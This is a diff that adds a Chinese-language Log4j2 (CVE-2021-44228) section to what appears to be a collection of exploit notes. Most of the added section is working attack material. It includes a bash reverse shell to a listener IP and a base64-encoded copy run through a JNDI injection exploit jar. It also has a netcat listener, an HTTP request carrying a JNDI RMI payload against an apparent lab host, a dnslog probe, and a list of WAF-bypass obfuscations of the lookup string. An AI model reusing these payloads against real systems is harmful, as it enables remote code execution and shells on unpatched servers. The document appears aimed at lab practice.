@@ -39,6 +39,8 @@
     - [1.2.24-rce](#1.2.24-rce)
     - [1.2.47-rce](#1.2.47-rce)
 
+- [log4j2](#log4j2)
+    - [CVE-2021-44228-log4j2-rce漏洞](#CVE-2021-44228-log4j2-rce漏洞)
 
 - [Grafana](#Grafana)
     - [Grafana插件模块目录穿越漏洞](#Grafana插件模块目录穿越漏洞)
@@ -390,6 +392,64 @@ nc -lvnp 8888
 
 
 
+## Log4j2
+
+Apache Log4j2 是一个基于 Java 的日志记录工具。该工具重写了 Log4j 框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。。 在大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。攻击者利用此特性可通过该漏洞构造特殊的数据请求包，最终触发远程代码执行。
+
+### CVE-2021-44228-log4j2-rce漏洞
+
+Log4j2反弹shell
+
+影响版本：all log4j-core versions >=2.0-beta9 and <=2.14.1
+
+
+sh -i >& /dev/tcp/10.30.1.49/7777 0>&1
+
+需要拿去base64编码链接如下
+
+https://www.jackson-t.ca/runtime-exec-payloads.html
+
+java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMzAuMS40OS83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}" -A 10.30.1.49
+
+
+
+![image](./img/log4j2-1.png)
+
+`nc -lvnp 7777`
+
+
+```
+POST /hello HTTP/1.1
+Host: vulfocus.fofa.so:30484
+Content-Type: application/x-www-form-urlencoded
+
+payload="${jndi:rmi://1.117.51.253:1099/pnlvzg}"
+```
+
+![image](./img/log4j2-2.png)
+
+
+其它dnslog payload：
+
+```
+c=${jndi:ldap://xxx.dnslog.cn}
+```
+
+Bypass WAF
+```
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
+${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
+${jndi:rmi://adsasd.asdasd.asdasd}
+${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
+${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
+```
+
+探测工具bp插件：
+- https://github.com/whwlsfb/Log4j2Scan
+- https://github.com/f0ng/log4j2burpscanner
+图形化测试工具：https://github.com/nice0e3/log4j_POC
 ## Grafana
 
 Grafana是一个开源的度量分析与可视化套件。
